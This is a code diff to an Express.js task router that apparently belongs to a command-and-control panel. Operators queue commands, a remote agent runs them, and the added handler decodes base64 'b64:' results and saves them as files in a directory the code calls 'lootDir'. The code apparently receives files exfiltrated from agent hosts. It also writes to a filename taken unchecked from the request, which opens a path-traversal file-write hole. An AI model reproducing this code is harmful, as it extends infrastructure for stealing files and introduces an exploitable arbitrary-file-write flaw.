@@ -3,6 +3,9 @@ const router  = express.Router();
 const Task    = require('../models/Task');
 const auth    = require('../middleware/auth');
 const agentAuth = require('../middleware/agentAuth');
+const fs = require('fs');
+
+
 
 // POST /api/tasks — operador cria tarefa via dashboard (protegido)
 // O servidor só transporta o comando. Quem gerencia cwd é o agente.
@@ -42,7 +45,21 @@ router.put('/:id/result', agentAuth, async (req, res) => {
     const task = await Task.findById(req.params.id);
     if (!task) return res.status(404).json({ error: 'Tarefa não encontrada' });
 
-    task.output      = req.body.output;
+    const output = req.body.output;
+    if (output.startsWith('b64:')) {
+      const parts = output.split(':');
+      const fileName = parts[1];
+      const b64 = parts.slice(2).join(':');
+      const buffer = Buffer.from(b64, 'base64');
+
+      const lootDir = require('path').join(__dirname, '..', '..', 'outputs');
+      fs.mkdirSync(lootDir, { recursive: true });
+      fs.writeFileSync(require('path').join(lootDir, fileName), buffer);
+
+      task.output = `Arquivo salvo em outputs/${fileName} (${buffer.length} bytes)`;
+    } else {
+      task.output = output;
+    }
     task.status      = 'completed';
     task.completedAt = new Date();
     await task.save();
